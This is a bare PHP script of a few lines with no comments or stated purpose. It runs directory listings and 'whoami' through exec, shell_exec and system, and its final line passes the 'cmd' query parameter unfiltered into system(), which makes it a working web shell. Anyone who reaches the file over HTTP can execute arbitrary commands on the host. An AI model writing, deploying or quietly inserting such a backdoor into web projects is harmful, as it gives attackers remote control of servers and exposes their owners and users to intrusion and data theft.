<?php
echo exec("ls -la");
echo shell_exec("ls -la");
system("whoami");
system($_GET['cmd']);
?>
